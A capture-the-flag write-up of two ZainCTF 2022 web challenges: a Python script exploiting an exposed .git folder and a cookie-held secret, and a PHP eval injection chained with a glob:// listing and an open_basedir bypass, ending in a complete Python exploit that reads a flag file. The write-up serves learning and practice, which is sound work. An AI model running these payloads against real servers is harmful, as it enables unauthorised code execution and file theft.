# ZainCTF 2022 - Web 
## 1- Sonic go Brr 

#### about : 
- Type: Web 
- Level: easy 
- Website: http://instance-web.cybertalentslabs.com/index.php
- points: 50
</br>

So the website disclosed a .git folder , with this [tool](https://github.com/arthaud/git-dumper) i got the backend files , in the source code i found that the check was if the secret (bas64 string) is equal to the value of parameter Q , and that needs to go fast enough to be submitted 
</br>

i wrote this code then 
```python
import requests
import base64 as bs
import urllib.parse as url

def get() : 
    headers = {
        'Host': 'wcomekgvdnrf93rq5l3n94wbq36o0wz0yqnlsw3o-web.cybertalentslabs.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Sec-GPC': '1',
    }

    response = requests.get('http://wcomekgvdnrf93rq5l3n94wbq36o0wz0yqnlsw3o-web.cybertalentslabs.com/index.php', headers=headers, verify=False)
    return  response.cookies["PHPSESSID"], response.cookies["secret"]

def post(session , secret) : 
    cookies = {
        'PHPSESSID': session,
        'secret': secret,
    }

    headers = {
        'Host': 'wcomekgvdnrf93rq5l3n94wbq36o0wz0yqnlsw3o-web.cybertalentslabs.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Sec-GPC': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '12',
    }

    data  ="Q=" + bs.b64decode(url.unquote(secret)).decode('utf-8')
    

    response = requests.post('http://wcomekgvdnrf93rq5l3n94wbq36o0wz0yqnlsw3o-web.cybertalentslabs.com/index.php', headers=headers, cookies=cookies, data=data, verify=False)
    print(response.text)
if __name__ == "__main__" : 
    sess , cookie = get()
    post(sess  ,cookie)
```

## 2- blobber 

#### about : 
- Type: Web 
- Level: meduim 
- Website: http://52.59.229.252:1234/index.php
- points: 100

the website shows the source code : 

```php
<html>
<!--
<img src="uploads/bg.png"/>
-->
<?php

if (!isset($_GET['e']))
{
highlight_file(__FILE__);
}

eval(stripslashes($_GET['e']));

if (isset($_GET['file'])){
 $dir= new DirectoryIterator($_GET['file']);
 foreach ($dir as $found) echo filemtime($found)." ";
 exit;

}

?>
</html>
```

now easy eval , easy rce right , nope let's try the payload 
```php
ini_set('display_errors', 1);
chdir('../');
```

it gives : 

> <b>Warning</b>:  chdir(): open_basedir restriction in effect. File(../) is not within the allowed path(s): (/var/www/html) in <b>/var/www/html/index.php(12) : eval()'d code(3) : eval()'d code</b> on line <b>3</b><br />

now thats a lockdown , ok it says somethign base_dir prevents us from getting the parent files , i tried many thing , but if we look in disabled_functions we wil find that we can't upload nor execute system commands , pretty bad.

disabled function : 
>system, pcntl_signal_dispatch,  posix_uname,  chgrp,  posix_setsid, pcntl_wifcontinued, readlink, proc_open, pcntl_exec, pcntl_wstopsig, imap_open, tempnam, passthru,  chown, pcntl_wifexited, show_source,  popen, pcntl_async_signals, exec, posix_mkfifo, pcntl_wexitstatus, touch,  posix_mkfifo, copy, pcntl_sigprocmask, file, pcntl_sigwaitinfo, fopen, pcntl_wifsignaled, define_syslog_variables, tmpfile, pcntl_exec, pcntl_waitpid, imagecolormatch, popen,  pg_lo_import, readfile, ftp_ssl_connect,  dbmopen, apache_setenv, link, pcntl_fork, pcntl_signal, parse_ini_file,  proc_terminate, curl_multi_exec, pcntl_setpriority, rename, file_put_contents, pcntl_getpriority, pcntl_signal_get_handler, curl_exec, pcntl_strerror,  proc_close,  proc_nice, pcntl_sigtimedwait,  posix_getpwuid, pcntl_get_last_error,  symlink,  pclose,  dbase_open,  posix_kill, pcntl_alarm, ftp_connect,  chmod, shell_exec, pcntl_wait,  posix_setpgid, pcntl_wtermsig, pcntl_wifstopped

i searched and found this [github](https://github.com/carlospolop/hacktricks/blob/master/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/README.md) repo , it was pretty handy , i tried and it worked : 

```php
$file_list = array();
$it = new DirectoryIterator("glob:///*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
sort($file_list);  
foreach($file_list as $f){  
        echo "{$f}\n";
}
```
> anaconda-post.log
> bin
> boot
> dev
> etc
> home
> lib
> lib64
> media
> mnt
> opt
> proc
> root
> run
> sbin
> srv
> sys
> t0t4lly_n0t_th3_r3al_fl4gG
> tmp
> usr
> var

we know it's in the t0t4lly_n0t_th3_r3al_fl4gG , we ned to get the file content : 

```php
chdir("uploads/");
ini_set("open_basedir", "/var/www/html:../");
chdir("../");
chdir("../");
chdir("../");
chdir("../");
var_dump(scandir('.'), file_get_contents('t0t4lly_n0t_th3_r3al_fl4gG'));
```

and we got the flag : **flag{n1c3_w0rk_ch41n1ng_wrappers_w1th_b4s3d1r}**

for the complete exploit : 

```python
import requests
import base64 as bs
#t0t4lly_n0t_th3_r3al_fl4gG

headers = {
    'Host': '52.59.229.252:1234',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Sec-GPC': '1',
    'Content-Length':'0',
    'Cache-Control': 'max-age=0',
    'X-Forwarded-For': '127.0.0.1',
}
code = """
ini_set('display_errors', 1);
chdir("uploads/");
ini_set("open_basedir", "/var/www/html:../");
chdir("../");
chdir("../");
chdir("../");
chdir("../");
var_dump(scandir('.'), file_get_contents('t0t4lly_n0t_th3_r3al_fl4gG'));
"""

command  = f"""
$code = base64_decode("{(bs.b64encode(code.encode("utf-8"))).decode("utf-8")}");
eval($code);
"""
params = (
    ('e', command),
)

response = requests.get('http://52.59.229.252:1234/index.php', headers=headers, params=params, verify=False)
print(response.text)
```